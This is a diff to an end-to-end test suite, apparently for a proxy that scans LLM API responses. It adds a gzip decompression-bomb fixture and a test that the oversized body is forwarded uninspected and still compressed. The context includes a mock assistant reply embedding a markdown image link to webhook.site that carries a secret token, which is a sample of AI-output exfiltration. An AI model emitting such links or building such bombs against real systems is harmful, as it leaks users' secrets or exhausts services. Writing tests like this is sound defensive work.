@@ -102,6 +102,11 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     return encoding === 'br' ? zlib.brotliCompressSync(raw) : zlib.gzipSync(raw)
   }
 
+  // #352: a JSON response that gzips to about 11 KB and expands to 1 MiB past
+  // proxy.maxBodyBytes, the size the proxy will inspect.
+  const BOMB = zlib.gzipSync(Buffer.from(JSON.stringify({ id: 'msg_b', type: 'message', role: 'assistant',
+    content: [{ type: 'text', text: 'a'.repeat(testConfig.proxy.maxBodyBytes + 1024 * 1024) }] })))
+
   beforeAll(async () => {
     tempDir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-respscan-e2e-'))
     process.env.LLM_FW_DIR = tempDir
@@ -123,7 +128,7 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
           : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
         const encoding = scenario.endsWith('-br') ? 'br' : 'gzip'
         res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': encoding })
-        res.end(encodeBody(text, encoding))
+        res.end(scenario === 'bomb' ? BOMB : encodeBody(text, encoding))
       })
     })
     await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
@@ -170,6 +175,17 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     expect(exfil).toBeDefined()
     expect(exfil!.action).toBe('blocked')
     expect(exfil!.exfilUrl).toContain('webhook.site')
+  })
+
+  // #352: the wire capture is capped, but what a compressed body expands to
+  // was not. Past the cap the proxy forwards the body as it came, uninspected,
+  // as it already does for an oversized plain body.
+  it('forwards a response that would expand past maxBodyBytes still compressed, without inflating it', async () => {
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'bomb', messages: [{ role: 'user', content: 'hi' }] }))
+    expect(res.statusCode).toBe(200)
+    expect(res.headers['content-encoding']).toBe('gzip')
+    expect(Buffer.byteLength(res.body, 'latin1')).toBeLessThan(BOMB.length * 2)
   })
 
   it('decompresses a clean gzip response untouched (no exfil event)', async () => {
